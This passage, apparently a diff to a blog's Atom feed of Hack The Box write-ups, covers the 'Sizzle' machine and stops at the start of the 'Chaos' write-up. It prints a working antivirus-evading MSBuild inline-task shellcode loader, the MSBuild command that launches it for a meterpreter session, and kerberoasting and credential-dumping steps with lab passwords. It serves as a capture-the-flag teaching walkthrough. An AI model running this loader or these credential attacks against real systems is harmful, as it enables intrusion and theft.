+0x2a,0xe9,0x47,0xb0,0x04,0x65,0x6a,0x8d,0x55,0xac,0x60,0xe2,0xd6,0xc6,0x68,
+0x26,0xfe,0x18,0x5b,0x3c,0xe2,0x6b,0x20,0x40,0x31,0x05,0xd1,0xec,0x84,0x2c,
+0x60,0x31,0xce,0x4a,0x77,0xcb,0xec,0x95,0x88,0x78,0x0b,0x12,0x71,0x9f,0x98,
+0x91,0x67,0x8d,0xb1,0x29,0xab,0xb4,0xd7,0xb8,0x73,0x67,0xa2,0x3f,0xc8,0xcf,
+0x3b,0x5c,0xbd,0x62,0x69,0x6b,0x41,0x59,0x0c,0x05,0xae,0xb2,0xf3,0xb4,0xe4,
+0x66,0x60,0x9f,0xa3,0xb6,0x90,0xb8,0xe6,0x1a,0x19,0xa5,0x99,0x22,0xcf,0xca,
+0xa5,0xe9,0xc1,0x64,0x30,0xce,0x4f,0x85,0xfe,0x7f,0xe4,0x0a,0x07,0xa0,0x58,
+0xcb,0x5e,0xcf,0x26,0x03,0xac,0x71,0x0e,0xdd,0x1c,0x0d,0x32,0xa5,0x9f,0x44,
+0x2f,0xeb,0xfd,0xad,0x69,0x5c,0x29,0x11,0x72,0x1b,0xd7,0x48,0xea,0x40,0xd3,
+0xc0,0x4d,0xc2,0x22,0x15,0x9b,0x33,0x64,0x47,0xab,0x90,0x22,0x90,0x0b,0x01,
+0x12,0x87,0x40,0x76,0x18,0x3f,0xec,0x40,0xd3,0xba,0x86,0xc6,0x76,0x3d,0xbb,
+0xc9,0x2c,0x5a,0x32,0x23,0x56,0x46,0x00,0xdc,0x8e,0x00,0x4c,0xe0,0x1a,0x04,
+0xd5,0x04,0x1b,0xee,0xc5,0x90,0x2d,0x9f,0x68,0xf5,0x11,0x48,0xcf,0x2d,0x85,
+0xef,0xe9,0x2b,0xc8,0x3f,0xf3,0x07,0x12,0xd7,0x23,0x93,0x5f,0x2d,0xab,0xe3,
+0x9a,0x37,0x42,0xf1,0xd2,0x7e,0xdc,0x6c,0x30,0x35,0x75,0xf6,0x1a,0x1c,0x8f,
+0x59,0x92,0x38,0xc7,0xb7,0x05,0xbd,0x76,0x31,0x21,0x6f,0x4c,0x6f,0x54,0xde,
+0x5e,0x4a,0xb0,0x1d,0xec,0xcb,0xd2,0x13,0x28,0xcc,0xf7,0xd8,0x13,0xac,0xcf,
+0x03,0x34,0xd7,0x4d,0xa2,0xdf,0x21,0x84,0x1d,0xf5,0xcc,0x64,0x8f,0x97,0xd7,
+0x2b,0xa2,0x89,0xb4,0x6e,0x8d,0xb0,0x0b,0xc0,0x09,0x43,0xa2,0xbe,0x97,0xe5,
+0x1d,0x58,0xe0,0x3f,0xb5,0xe5,0xe2,0xc0,0x3a,0x8e,0x2e,0xfc,0x90,0x2a,0x06,
+0xaa,0xe4,0x97,0x53,0x70,0x70,0xa4,0xf2,0xce,0x8f,0x11,0x57,0x05,0xe4,0x39,
+0x4c,0xf2,0x7b,0x1a,0x45,0xd1,0xce,0xc9,0xf4,0x20,0xf2,0xbd,0x13,0xdf,0xc2,
+0x65,0xd0,0x5c,0x4e,0x77,0xe4,0x59,0x3d,0xa5,0xb5,0x8b,0x05,0x6d,0x9d,0x61,
+0x72,0x17,0xde,0x9c,0xfd,0x4d,0x30,0x8a,0x51,0xa8,0xf6,0x47,0x85,0xff,0x7e,
+0x74,0x88,0x8b,0x10,0xa1,0xee,0xaf,0xef,0xb5,0x53,0xe2,0x5c,0x36,0x8a,0x54,
+0xa0,0xf5,0xd0,0x4b,0x5f,0x0e,0x74,0x49,0x72,0x9e,0xc5,0x66,0xbd,0xca,0x2d,
+0x20,0x16,0x16,0x1c,0x83,0x59,0x08,0xbb,0x5b,0x1d,0x8f,0x91,0xda,0xb5,0xa7,
+0xe6,0xda,0xb7,0xfb,0x8a,0x32,0xc3,0x2f,0x73,0xe0,0x27,0x4c,0x07,0x19,0x49,
+0xf8,0x55,0xba,0x69,0x64,0xf9,0xad,0xd5,0x2a,0xa5,0xab,0xfd,0x3b,0x5c,0x7d,
+0x73,0xc7,0xf9,0x65,0x62,0xc3,0xc6,0xd7,0x3f,0x10,0x9e,0x0d,0x35,0x52,0xb7,
+0x4e,0x17,0xdf,0x7d,0x59,0x47,0xfb,0xf1,0x02,0x58,0x25,0xf6,0xe9,0x59,0x9c,
+0xf6,0x70,0xc4,0x19,0x66,0x01,0x81,0xb5,0xde,0x7a,0x28,0xbf,0x45,0x66,0xc5,
+0x96,0x7e,0x55,0x09,0x21,0x58,0x7c,0xcf,0x34,0x66,0x67,0x9e,0xd3,0x55,0x63,
+0x3f,0x01,0x1f,0x14,0x42,0x4b,0x29,0xca,0x89,0x27,0xc7,0x0f,0x77,0xb0,0xe6,
+0x13,0x3d,0x37,0x15,0xc0,0x2b,0x5e,0x40,0x20,0x86,0x30,0x0d,0xc5,0x46,0x98,
+0xab,0xb0,0x2b,0x92,0xc5,0x22,0x21,0x92,0xf6,0x1c,0x03,0x27,0x0a,0x7c,0x84,
+0x4b,0x54,0x0a,0xf3,0x6e,0xc6,0x50,0xe5,0xf6,0x28,0x9b,0x7d,0xa5,0xa3,0x21,
+0x75,0xaa,0xb0,0xd7,0xf3,0xa0,0xa5,0xd0,0x7f,0x90,0x75,0xf1,0x16,0x8b,0x98,
+0x70,0x15,0x5a,0xc5,0x58,0x38,0xc1,0xaf,0x87,0xbb,0xce,0x65,0x2f,0x6d,0xb1,
+0x2d,0x69,0x47,0x4d,0x34,0xf9,0x02,0xb9,0x66,0x4f,0x93,0xe2,0x7c,0x26,0x76,
+0x01,0x12,0x1e,0x86,0x81,0x69,0x8d,0xa5,0x31,0x67,0x1b,0x61,0x5b,0x02,0xb4,
+0x21,0xa9,0x70,0xbe,0xbb,0x23,0x22,0x6d,0x1d,0xc8,0x19,0x23,0x41,0xfc,0x6c,
+0x41,0x12,0x17,0xbf,0x99,0x4e,0x9c,0xc2,0x5c,0x18,0xbf,0xcc,0x1a,0xb4,0x2d,
+0x9e,0x26,0xa5,0x7d,0x1e,0xdc,0x50,0x1f,0xd9,0x0a,0x79,0xf3,0x29,0x16,0xb6,
+0x49,0xda,0x55,0x51,0xc9,0x54,0x2e,0x46,0x68,0x9b,0xec,0x3b,0xd4,0x61,0x27,
+0x50,0x3a,0x47,0x74,0x62,0x07,0x0f,0x83,0xcd,0xc2,0x26,0x20,0xb7,0xa3,0xd7,
+0x0e,0xa6,0x6c,0xfd,0xb0,0x2f,0xd5,0x0f,0x6f,0x35,0x5d,0x4f,0x2b,0x14,0xe7,
+0xca,0x6f,0x78,0x0e,0xfb,0x09,0x5c,0x25,0x0c,0x99,0xc4,0xa5,0x92,0x30,0x3e,
+0xbb,0x4c,0x46,0xa9,0xa0,0xe6,0xf0,0x75,0x12,0xad,0x6c,0xc1,0xef,0xcc,0xf2,
+0x67,0x5f,0x22,0xff,0xa1,0x53,0xad,0xc5,0x57,0x8b,0xcc,0x0a,0xd5,0x94,0xa8,
+0x91,0x41,0xc2,0x47,0xd5,0xa1,0x27,0x1f,0x0b,0x47,0x2d,0xa8,0xf4,0xc6,0xdb,
+0x5d,0x17,0x36,0x44,0x23,0x26,0x30,0xa8,0xd6,0x97,0x93,0xf2,0x48,0x7c,0x34,
+0xbd,0x94,0xb9,0xa2,0x5e,0x78,0x66,0xde,0xbf,0x31,0x7e,0x5a,0x7f,0xbc,0xe9,
+0xaa,0x7a,0x00,0xaa,0x8f,0xc8,0x15,0x65,0x84,0x6c,0x1e,0x95,0x43,0xc3,0x82,
+0x0a,0x65,0x16,0x73,0xe3,0x47,0xe6,0xfa,0x62,0x80,0x9f,0xa9,0x28,0x8c,0x4c,
+0xbd,0xe2,0xbb,0x82,0x8b,0xd1,0x80,0x00,0x84,0x6d,0x8d,0x80,0x4e,0x7d,0xce,
+0x84,0x91,0x94,0x74,0x8c,0x30,0xc9,0x49,0x59,0x7b,0x9c,0x0d,0x06,0x60,0x3d,
+0x12,0xaf,0x55,0x33,0x12,0x51,0xcb,0x05,0x53,0x8b,0x29,0xcb,0xd5,0xd2,0x00,
+0xc7,0x73,0xda,0x2a,0x5a,0x6d,0x34,0xed,0x5d,0x61,0xec,0xb0,0xe6,0x0a,0x23,
+0x61,0xa9,0xd5,0x1d,0x97,0x01,0x0b,0x98,0xfe,0x8b,0xad,0x16,0x2e,0x96,0x87,
+0xd8,0x86,0xc3,0x46,0xeb,0xd0,0x41,0x6c,0x10,0xa4,0xd2,0xdf,0x07,0x4e,0x7f,
+0x65,0x66,0x99,0x40,0x5f,0xdb,0x8d,0x85,0xd4,0x0d,0x1a,0xe3,0x5f,0x3a,0x38,
+0x5c,0x4e,0xeb,0xa1,0x5a,0xfc,0x46,0x78,0xc6,0xa6,0x3d,0x6a,0x04,0x2a,0x07,
+0xf5,0x3d,0xac,0x08,0xe9,0x22,0x13,0xa9,0x75,0x78,0x81,0xd1,0x3c,0x93,0x4b,
+0x44,0x18,0x8b,0xfa,0xef,0xa2,0xb4,0x91,0x52,0xae,0x4b,0xae,0xf2,0x8e,0xdf,
+0xac,0x96,0xf1,0xde,0x18,0x40,0x5f,0x13,0x5c,0xe6,0xa8,0x39,0x04,0x05,0x00,
+0x53,0xfb,0x69,0x4c,0x93,0x0a,0x88,0x25,0x28,0xbc,0xdd,0xde,0xc6,0xcf,0x55,
+0x7e,0x7b,0xef,0x95,0x34,0x6b,0x0d,0x04,0x4d,0x02,0xd9,0x6e,0x86,0xce,0xf0,
+0x2d,0xd8,0x79,0x68,0xde,0x1c,0xe7,0xf5,0xc4,0x94,0x38,0xc4,0x6a,0xdd,0x2a,
+0x37,0x7c,0xfe,0x42,0x2a,0x5d,0xf3,0xae,0xeb,0x09,0x99,0xfa,0x52,0xc4,0x9c,
+0x67,0xd7,0x33,0x8b,0x3d,0xc3,0xa3,0x95,0x5d,0x3c,0x83,0x3b,0xcf,0x23,0x25,
+0x7f,0xbe,0x42,0x11,0xb8,0x44,0xba,0xf5,0xf7,0xfa,0x76,0xfb,0xe8,0xc5,0x74,
+0xa8,0x7e,0x5b,0xef,0xa7,0x98,0x54,0x6f,0x81,0x5f,0x72,0x9f,0x89,0xc1,0xcc,
+0x7d,0x93,0xa8,0xee,0x2c,0x41,0x8f,0x09,0xbe,0x3f,0x9e,0xc5,0x9c,0x73,0xaf,
+0xe3,0x38,0x67,0x5e,0xa8,0x01,0xd7,0xce,0x5b,0xcb,0x63,0xfc,0x11,0x52,0xbc,
+0x5e,0xc8,0xa6,0x79,0x54,0x65,0xf0,0xcf,0xe0,0x10,0xbd,0x90,0x4f,0x89,0xde,
+0xd0,0x8c,0xbd,0xbb,0x61,0x46,0xd6,0x5e,0xff,0x90,0x32,0x77,0x0a,0xb4,0x7f,
+0x84,0xee,0xbc,0x91,0x62,0x12,0x9d,0x29,0x02,0xcd,0x64,0x3a,0x35,0x06,0x49,
+0x4d,0xa3,0xe5,0x00,0x88,0x5f,0xc0,0xa3,0x07,0xcb,0xc7,0x61,0x1b,0x36,0x19,
+0x0e,0xe3,0x28,0x35,0x8e,0xa2,0xc3,0xc0,0xa1,0xc9,0x50,0x34,0xe8,0xb4,0x85,
+0x9a,0x8d,0x12,0xe3,0x4d,0xaa,0xcb,0x5c,0x5c,0xc8,0xe2,0xcb,0xe9,0x44,0x68,
+0x3a,0x82,0x1c,0x53,0xf6,0x54,0xab,0xda,0x85,0xb8,0x9e,0x3a,0xd8,0xce,0x33,
+0x13,0xc4,0x24,0xed,0x99,0x83,0xfb,0xb0,0x90,0x63,0xc2,0xa8,0x97,0xbc,0x40,
+0xe7,0xc9,0x6d,0x17,0x58,0x54,0xf6,0x72,0x63,0x3a,0x41,0x43,0xe3,0xa6,0xbc,
+0x2d,0xd3,0xe0,0x0c,0x9a,0x10,0xcf,0x7a,0x3c,0xad,0xcf,0x6b,0x39,0xb2,0x74,
+0x3e,0xef,0xd9,0xc7,0xe7,0x2e,0x46,0x7e,0xb8,0xd6,0x2a,0x54,0x47,0x59,0x0c,
+0xe1,0x18,0x90,0xd1,0xa0,0x00,0x76,0x59,0x14,0x86,0xe5,0xb6,0x31,0xf4,0x9b,
+0xea,0x01,0x43,0xf0,0x8c,0xc9,0x36,0x9d,0x9d,0x40,0xe1,0x0f,0xcc,0xdd,0xb6,
+0x8f,0x49,0xfa,0x2c,0x89,0xb8,0x4e,0x7b,0x18,0x25,0x60,0x7e,0x7f,0x54,0xcc,
+0xfa,0x07,0x7a,0x67,0x72,0xb3,0x89,0xf8,0x66,0x41,0x6b,0x34,0x03,0x11,0x12,
+0xd1,0xdd,0x39,0x36,0x30,0x23,0xdf,0x87,0xa2,0x65,0x61,0x66,0x1f,0x54,0x3f,
+0x46,0xb5,0x74,0x71,0xb9,0x38,0x8a,0xb4,0xa0,0xfc,0x3c,0x43,0xec,0x51,0xc6,
+0x6f,0xab,0xde,0x4d,0xd1,0x7e,0x45,0xb5,0x08,0x85,0x41,0x25,0x58,0x02,0x26,
+0xdf,0x24,0xcd,0x06,0x41,0x4f,0x96,0xe4,0x13,0x43,0xc0,0x05,0xf7,0xac,0x31,
+0x89,0x1d,0x42,0x7d,0x47,0x83,0x3b,0x41,0x64,0xc2,0xba,0x3b,0x38,0xdb,0xde,
+0x32,0x26,0x3c,0xe7,0xab,0x5c,0x01,0x37,0x35,0x32,0x1a,0x25,0xa2,0x30,0x69,
+0xf0,0x2c,0xfe,0x5a,0x9b,0x94,0xc7,0x3d,0xfb,0x37,0x74,0x4e,0x58,0xef,0x78,
+0xd6,0xdf,0xbd,0x18,0x34,0x09,0xd4,0x6d,0xca,0x47,0xb6,0xbf,0x77,0xf8,0x31,
+0x2b,0xc2,0x1f,0xf9,0x93,0x98,0xaf,0xe5,0x86,0xe3,0x35,0xc6,0x57,0xdf,0x17,
+0x1d,0x0a,0xec,0x3e,0x45,0xb2,0xc8,0xa8,0x45,0x70,0xc2,0x8d,0xe8,0x05,0x68,
+0xb2,0xd1,0x36,0x67,0x63,0xd6,0xa9,0x82,0x99,0x14,0x98,0x45,0xc1,0x3c,0x87,
+0x21,0xb2,0x6c,0x71,0x72,0xb1,0x80,0x11,0x74,0x05,0xed,0x15,0x96,0x88,0x9b,
+0x44,0x16,0x10,0xa7,0x00,0x02,0xf2,0x77,0xa5,0xc1,0xdf,0xe3,0xd9,0xd6,0xf9,
+0xfd,0xb0,0x27,0x0a,0x07,0x31,0xf4,0x4f,0x22,0x7d,0xc1,0x20,0xbd,0x87,0x30,
+0x99,0xd9,0x52,0xcf,0xa4,0x79,0x10,0x01,0x33,0x59,0xc9,0x89,0xa6,0xd5,0xb8,
+0xd0,0xe7,0x80,0x7b,0xe4,0xc3,0x3b,0x9d,0x9c,0x9d,0x9c,0xea,0xba,0xab,0x54,
+0x4a,0x87,0xe1,0x7d,0x71,0xe9,0xe9,0xbb,0xd9,0x17,0xdc,0xd3,0x3f,0xbf,0x4c,
+0x7f,0xcd,0xde,0xa0,0x64,0x41,0x20,0xb4,0x24,0x30,0x57,0xcf,0xe8,0x04,0xc2,
+0xe4,0x7c,0xb2,0xa5,0x28,0x33,0x6c,0xe8,0x7b,0x9a,0xac,0xc9,0x0c,0xb3,0xb7,
+0x48,0xbd,0xb3,0x6a,0xf1,0xfc,0x31,0xcb,0x21,0x39,0x32,0x97,0x7b,0x3c,0x9e,
+0x66,0xfa,0xca,0xfe,0xa3,0xcb,0x41,0x2f,0x0f,0x4b,0x6d,0x0b,0x54,0x78,0x2e,
+0x85,0x51,0xa5,0x51,0x76,0xef,0xf5,0xf3,0xa7,0xff,0x4a,0x5f,0x7b,0x8d,0xb0,
+0x15,0x85,0x78,0xbb,0xd3,0x0a,0x21,0x46,0x3f,0xeb,0x6c,0x9b,0xed,0xd5,0x80,
+0xaa,0xf2,0x6b,0x48,0xb1,0x88,0x39,0x3c,0xa8,0x68,0x50,0x06,0xb5,0xa5,0x23,
+0x6c,0x8e,0x0c,0xa5,0x95,0x38,0x45,0xfc,0xf5,0xe8,0x7a,0xcb,0xf6,0x91,0xd9,
+0xbc,0x9a,0x4b,0x1a,0x60,0xb1,0xc6,0xa7,0xc5,0x0e,0x4b,0xc1,0x74,0xc7,0x74,
+0x0e,0xe2,0xdb,0xca,0xce,0xee,0xf4,0x5d,0x80,0xa6,0x7f,0x05,0x8c,0xf1,0xa4,
+0x63,0x5e,0xd2,0xca,0xb0,0xc0,0xd1,0xb8,0xb1,0x22,0x8e,0x26,0xac,0x55,0xd4,
+0x41,0x36,0x42,0xff,0xb6,0xfc,0x87,0x62,0xfe,0x8b,0x4f,0x47,0x83,0xc4,0x93,
+0x38,0x7c,0xfb,0x55,0xa3,0xd8,0xc2,0x53,0x1f,0x27,0x47,0x75,0x56,0xfc,0xcd,
+0xc9,0x9e,0x08,0xfe,0x35,0x74,0x2a,0xf3,0x27,0x22,0xad,0x8e,0x41,0xde,0xb6,
+0xf2,0xf2,0xe8,0xb7,0x82,0x3b,0x66,0x38,0x95,0x46,0x4e,0x35,0x75,0x48,0x86,
+0xab,0xdd,0x43,0x08,0xc7,0xcd,0x29,0xac,0x20,0xb5,0x3a,0x75,0x5f,0x39,0x85,
+0xf1,0xd4,0xd4,0xf6,0xb6,0x35,0x65,0xc4,0x57,0x05,0x69,0x90,0x9a,0xfb,0x18,
+0xee,0x0d,0xd3,0x02,0xae,0x40,0x38,0xac,0xaa,0x40,0x4c,0x9c,0xc9,0x3a,0xca,
+0x24,0x09,0xe7,0x0c,0x8c,0x68,0xb5,0x66,0x61,0x78,0xf2,0xd0,0x29,0xea,0x33,
+0xeb,0xb5,0x4d,0xc4,0xc8,0x8e,0xf1,0x28,0xdf,0xed,0xee,0xe9,0x29,0xc5,0x91,
+0xea,0x1f,0x7d,0x47,0xbd,0xf9,0xde,0x66,0x58 };
+
+
+              
+              UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
+                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+              Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
+              IntPtr hThread = IntPtr.Zero;
+              UInt32 threadId = 0;
+              IntPtr pinfo = IntPtr.Zero;
+              hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
+              WaitForSingleObject(hThread, 0xFFFFFFFF);
+              return true;
+          } 
+        }     
+      ]]&amp;gt;
+      &amp;lt;/Code&amp;gt;
+    &amp;lt;/Task&amp;gt;
+  &amp;lt;/UsingTask&amp;gt;
+&amp;lt;/Project&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\windows\system32\spool\drivers\color\shellcode.xml&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/sizzle/37.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;this-time-it-worked-and-i-got-meterpreter-&quot;&gt;This time it worked and I got &lt;code class=&quot;highlighter-rouge&quot;&gt;meterpreter&lt;/code&gt; !&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/38.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;kerberoasting-privilege-escalation&quot;&gt;Kerberoasting, Privilege Escalation&lt;/h3&gt;
+&lt;h4 id=&quot;now-we-have-a-meterpreter-session-we-can-route-the-internal-subnet-use-a-proxy-then-use-getuserspnspy-and-see-if-any-user-is-kerberoastable-this-technique-is-covered-here&quot;&gt;Now we have a &lt;code class=&quot;highlighter-rouge&quot;&gt;meterpreter&lt;/code&gt; session, we can route the internal subnet, use a proxy then use &lt;code class=&quot;highlighter-rouge&quot;&gt;GetUserSPNs.py&lt;/code&gt; and see if any user is kerberoastable. This technique is covered &lt;a href=&quot;https://www.blackhillsinfosec.com/a-toast-to-kerberoast/&quot;&gt;here&lt;/a&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;first-thing-is-to-configure-proxychains-to-use-port-8080-&quot;&gt;First thing is to configure &lt;code class=&quot;highlighter-rouge&quot;&gt;proxychains&lt;/code&gt; to use port 8080 :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/proxychains.conf&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/sizzle/39.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;then-we-will-use-auxiliaryserversocks4a-to-add-the-route-set-up-the-proxy-&quot;&gt;Then we will use &lt;code class=&quot;highlighter-rouge&quot;&gt;auxiliary/server/socks4a&lt;/code&gt; to add the route set up the proxy :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/40.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;route-add-1010100-2552552550-1-this-adds-a-route-of-the-whole-internal-subnet-where-1-is-the-session-number&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;route add 10.10.10.0 255.255.255.0 1&lt;/code&gt; this adds a route of the whole internal subnet where &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt; is the session number.&lt;/h4&gt;
+&lt;h4 id=&quot;now-we-are-ready-lets-kerberoast-&quot;&gt;Now we are ready. Let’s kerberoast !&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;proxychains GetUserSPNs.py -request -dc-ip 10.10.10.103 HTB.LOCAL/amanda:Ashare1972&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/sizzle/41.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;user-mrlky-was-kerberoastable-and-we-got-a-hash-lets-pass-it-to-john-&quot;&gt;User &lt;code class=&quot;highlighter-rouge&quot;&gt;mrlky&lt;/code&gt; was kerberoastable and we got a hash, let’s pass it to &lt;code class=&quot;highlighter-rouge&quot;&gt;john&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/42.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;password-is-football7-now-we-can-use-secretdumppy-again-and-do-the-same-thing-we-did-before-&quot;&gt;Password is &lt;code class=&quot;highlighter-rouge&quot;&gt;Football#7&lt;/code&gt;, now we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;secretdump.py&lt;/code&gt; again and do the same thing we did before :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/43.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/sizzle/44.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/sizzle/45.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/sizzle/46.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
+&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
+&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---chaos&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/chaos/&quot;&gt;Hack The Box - Chaos&lt;/a&gt;&lt;/h4&gt;
+&lt;hr /&gt;</content><author><name></name></author><category term="Windows" /><category term="Active Directory" /><category term="Windows Exploitation" /><category term="Networking" /><category term="smb" /><summary type="html">Quick Summary Hey guys today Sizzle retired and here’s my write-up about it. Sizzle was a great machine, everything about it was great. It was very realistic, fun and of course challenging as it was rated Insane. Personally one of my favorites and one of the best Active Directory boxes I have ever solved. It starts by getting write access to a directory in an smb share, a simple scf file attack with responder and john could give me a password for a user. With that password I could generate a certificate request and get a certificate then a WinRm session. After that comes the most challenging part about the box which is bypassing antivirus, kerberoasting and privilege escalation but before doing that we will take a look at an unintended way first. That was the box in a nutshell, It’s a Windows box and its ip is 10.10.10.103, I added it to /etc/hosts as sizzle.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC sizzle.htb Full Output : ``` Nmap 7.70 scan initiated Fri May 31 19:41:35 2019 as: nmap -sV -sT -sC -o nmapinitial sizzle.htb Nmap scan report for sizzle.htb (10.10.10.103) Host is up (0.15s latency). Not shown: 987 filtered ports PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd |ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: | SYST: Windows_NT 53/tcp open domain? | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |http-server-header: Microsoft-IIS/10.0 |_http-title: Site doesn’t have a title (text/html). 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2019-05-31T17:44:44+00:00; -6s from scanner time. 443/tcp open ssl/http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Site doesn’t have a title (text/html). | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2019-05-31T17:44:41+00:00; -6s from scanner time. | tls-alpn: | h2 | http/1.1 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2019-05-31T17:44:43+00:00; -5s from scanner time. 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2019-05-31T17:44:42+00:00; -6s from scanner time. 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2019-05-31T17:44:41+00:00; -6s from scanner time. 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.70%I=7%D=5/31%Time=5CF1678A%P=i686-pc-linux-gnu%r(DNSVer SF:sionBindReqTCP,20,”\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x0 SF:4bind\0\0\x10\0\x03”); Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/sizzle/0.png" /></entry><entry><title type="html">Hack The Box - Chaos</title><link href="http://localhost:4000/hack-the-box/chaos/" rel="alternate" type="text/html" title="Hack The Box - Chaos" /><published>2019-05-25T00:00:00+02:00</published><updated>2019-05-25T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/chaos</id><content type="html" xml:base="http://localhost:4000/hack-the-box/chaos/">&lt;hr /&gt;
 
 &lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
 &lt;h4 id=&quot;hey-guys-today-chaos-retired-and-heres-my-write-up-about-it-chaos-was-a-ctf-style-machine-i-cant-say-that-it-simulated-a-real-life-situation-i-had-fun-solving-this-box-some-steps-were-straightforward-others-were-very-tricky-about-main-steps-to-get-an-initial-shell-as-www-data-we-will-exploit-a-web-application-that-used-latex-after-that-we-will-escalate-privileges-to-another-user-and-escape-rbash-for-root-privilege-escalation-we-will-extract-root-credentials-from-a-firefox-profile-and-get-a-root-shell-its-a-linux-box-and-its-ip-is-101010120-i-added-it-to-etchosts-as-chaoshtb-lets-jump-right-in&quot;&gt;Hey guys today Chaos retired and here’s my write-up about it. Chaos was a CTF-style machine, I can’t say that it simulated a real life situation. I had fun solving this box, some steps were straightforward others were very tricky. About main steps, To get an initial shell as &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt; we will exploit a web application that used &lt;a href=&quot;https://en.wikipedia.org/wiki/LaTeX&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;LaTeX&lt;/code&gt;&lt;/a&gt;. After that we will escalate privileges to 